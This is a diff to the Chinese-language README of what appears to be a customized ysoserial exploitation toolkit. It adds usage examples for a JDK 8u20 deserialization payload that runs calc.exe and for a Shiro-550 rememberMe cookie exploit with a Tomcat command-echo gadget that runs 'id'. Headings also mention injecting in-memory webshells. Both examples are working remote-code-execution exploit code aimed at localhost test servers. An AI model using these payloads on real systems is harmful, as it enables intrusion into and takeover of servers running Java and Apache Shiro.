@@ -32,6 +32,27 @@
 
 > 对增加的一些 features 的用法，做简单的展示
 
+### jdk8u20 使用
+
+```java
+package top.inhann;
+
+import ysoserial.payloads.Jdk8u20_my;
+import ysoserial.payloads.util.HttpRequest;
+
+public class Test {
+
+    public static void main(String[] args) throws Exception{
+        String url = "http://127.0.0.1:8080/bitch";
+        byte[] ser = new Jdk8u20_my().getPayload("calc.exe");
+        byte[] resp = new HttpRequest(url).addPostData(ser).send();
+        System.out.println(new String(resp));
+    }
+}
+```
+
+
+
 ### 注入内存马：
 
 filter 内存马：
@@ -283,6 +304,29 @@ public class Test {
 }
 
 ```
+
+
+
+### shiro550
+
+```java
+import ysoserial.payloads.util.HttpRequest;
+import ysoserial.payloads.CommonsBeanutils183;
+import ysoserial.payloads.Shiro_550;
+import ysoserial.payloads.rceecho.TomcatEcho3;
+
+public class Shiro550Exp {
+    public static void main(String[] args) throws Exception{
+        String url = "http://localhost:8080/shiro550/";
+        Object o = new TomcatEcho3().getObject(CommonsBeanutils183.class);
+        String cookie = new Shiro_550().getPayload(o);
+        byte[] resp = new HttpRequest(url).addHeader("Cookie","rememberMe=" + cookie).addParam("cmd","id").addHeader("cmd","id").send();
+        System.out.println(new String(resp));
+    }
+}
+```
+
+
 
 
 
